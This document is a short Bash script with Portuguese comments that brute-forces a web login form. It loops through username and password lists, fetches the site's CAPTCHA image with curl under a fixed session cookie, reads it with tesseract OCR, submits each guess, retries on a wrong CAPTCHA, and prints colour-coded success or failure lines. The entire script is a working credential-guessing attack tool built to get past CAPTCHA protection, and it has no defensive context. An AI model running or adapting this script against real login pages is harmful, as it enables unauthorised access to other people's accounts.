#!/bin/bash

USERS="./users.txt"
PASSWORDS="./passwords.txt"

for USER in $(cat $USERS)
do
        for PASS in $(cat $PASSWORDS)
        do

                STATUS="Captcha incorreto"

                while [ "$STATUS" == "Captcha incorreto" ]
                do
                        # captcha.php?l=150&a=50&tf=20&ql=5 - é o elemento onde a imagem é gerada, procure em Inspecionar a página
                        curl -s "URL/captcha.php?l=150&a=50&tf=20&ql=5" -H 'Cookie: PHPSESSID=r8n9p20c0jtf8dob9ef787sqn7' --output image

                        CAPTCHA=$(tesseract image stdout | tr -d " " | xargs)

                        # r8n9p20c0jtf8dob9ef787sqn7 é um cookie aleatório
                        STATUS=$(curl -s 'URL_Completa' -H 'Cookie: PHPSESSID=r8n9p20c0jtf8dob9ef787sqn7' --data-raw "username=$USER&password=$PASS&captcha=$CAPTCHA" -L | egrep -o "<p style=\"color:red\" >.*</p>" | sed -r "s/.*>(.*)<.*/\1/g")

                        # curl - serve para fazer a requesição

                        if [ "$STATUS" == "" ]
                        then                
                                COLOR='\033[0;32m'
                                NC='\033[0m' # No Color                                
                                STATUS="Sucesso"

                        elif [ "$STATUS" == "Captcha incorreto" ]
                        then
                                COLOR='\033[0;33m'
                                NC='\033[0m' # No Color
                        else
                                COLOR='\033[0;31m'                                 
                        fi

                        echo -e "${COLOR}User: $USER - Pass: $PASS - Status: $STATUS${NC}"        
                done        

        done
done